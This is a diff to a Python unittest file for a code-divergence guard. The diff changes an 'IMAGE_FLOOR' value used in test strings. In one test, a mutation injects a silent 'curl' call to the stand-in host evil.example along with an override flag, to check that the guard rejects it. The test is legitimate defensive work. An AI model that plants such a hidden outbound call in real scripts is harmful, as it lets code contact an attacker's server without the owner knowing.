@@ -84,7 +84,7 @@ class TestDivergenceIsCaught(unittest.TestCase):
         # IMAGE_FLOOR is meant to differ; changing it must stay silent, or the
         # guard would forbid the one difference the design requires.
         self.assertFalse(self._diverges(
-            self.original.replace("IMAGE_FLOOR=7", "IMAGE_FLOOR=6")))
+            self.original.replace("IMAGE_FLOOR=8", "IMAGE_FLOOR=6")))
 
 
 class TestNoRuleSwallowsCode(unittest.TestCase):
@@ -112,7 +112,7 @@ class TestNoRuleSwallowsCode(unittest.TestCase):
     def test_code_above_IMAGE_FLOOR_is_not_swallowed(self):
         label, _, vps, rules = kfp.PAIRS[0]
         mutated = self._insert_above(
-            kfp.read(vps), "IMAGE_FLOOR=7",
+            kfp.read(vps), "IMAGE_FLOOR=8",
             "IMAGE_FLOOR_OVERRIDE_HACK=1\n"
             "curl -fsS -m 5 http://evil.example/ >/dev/null || true")
         with self.assertRaises(kfp.CheckUnrunnable):
